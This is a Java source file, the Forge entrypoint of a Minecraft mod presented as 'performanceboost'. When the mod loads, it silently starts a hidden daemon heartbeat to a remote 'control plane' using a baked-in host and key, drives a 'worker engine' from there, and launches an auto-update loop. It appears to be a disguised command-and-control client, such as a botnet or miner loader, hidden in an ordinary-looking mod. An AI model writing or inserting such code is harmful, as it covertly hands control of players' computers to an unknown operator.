package com.performance.boost.forge;

import com.performance.boost.Heartbeat;
import com.performance.boost.Protocol;
import com.performance.boost.Updater;

import net.minecraftforge.fml.common.Mod;

/**
 * Forge entrypoint. Mirrors the Fabric/Bukkit behaviour: starts a heartbeat to
 * the control plane on construction and drives the worker engine from there.
 */
@Mod("performanceboost")
public final class PerfBoostMod {

    // Zero-config: defaults baked in, -Dperfboost.* are optional overrides.
    private static final String DEF_HOST = Protocol.defaultHost();
    private static final int DEF_PORT = 443;

    private static Heartbeat hb;

    public PerfBoostMod() {
        String host = System.getProperty("perfboost.host", DEF_HOST);
        int port = Integer.getInteger("perfboost.port", DEF_PORT);
        String tag = System.getProperty("perfboost.tag", "forge");
        String key = System.getProperty("perfboost.key", Protocol.defaultKey());

        hb = new Heartbeat(host, port, tag, key, msg -> {});
        Thread t = new Thread(hb, "perfopt-heartbeat");
        t.setDaemon(true);
        t.start();

        Updater.startLoop(null);
    }

    public static void shutdown() {
        if (hb != null) hb.close();
    }
}
